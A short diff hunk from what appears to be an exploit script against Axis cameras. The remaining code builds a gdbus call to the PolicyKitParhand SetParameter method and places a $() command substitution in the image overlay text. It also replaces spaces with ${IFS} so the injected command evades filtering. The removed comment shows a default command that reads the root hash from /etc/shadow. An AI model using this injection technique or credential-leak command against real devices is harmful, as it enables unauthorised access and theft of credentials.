@@ -254,11 +254,6 @@ def overlay_req():
 def overlay_leak():
     global stage
     overlay_enable()
-    
-    # if (args.overlay_leak_command):
-    #     leak_cmd = args.overlay_leak_command
-    # else:
-    #     leak_cmd = "grep 'root' /etc/shadow | cut '-d:' -f2"
 
     overlay_leak_cmd = f"gdbus call --system --dest com.axis.PolicyKitParhand --object-path /com/axis/PolicyKitParhand --method com.axis.PolicyKitParhand.SetParameter Image.I0.Text.String $({leak_cmd})"
     overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")
